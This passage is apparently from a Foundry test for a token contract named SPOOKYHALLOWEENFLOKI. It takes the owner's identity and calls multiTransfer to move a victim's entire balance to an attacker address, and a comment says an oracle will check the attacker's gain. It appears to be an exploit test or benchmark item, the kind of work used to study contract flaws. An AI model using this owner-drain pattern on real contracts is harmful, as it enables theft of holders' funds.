        uint256 initialBalance = IERC20(0x9f59E79127fAD40bBC26c1eC6578d345AF40bD1f).balanceOf(address(this));
        owner = SPOOKYHALLOWEENFLOKI(TARGET).owner();

        uint256 victimBalance = SPOOKYHALLOWEENFLOKI(TARGET).balanceOf(victim);
        assertTrue(victimBalance > 0);

        vm.startPrank(owner);

        address[] memory addresses = new address[](1);
        addresses[0] = attacker;

        uint256[] memory tokens = new uint256[](1);
        tokens[0] = victimBalance;

        SPOOKYHALLOWEENFLOKI(TARGET).multiTransfer(victim, addresses, tokens);

        vm.stopPrank();

        // Oracle will check if attacker's balance increased
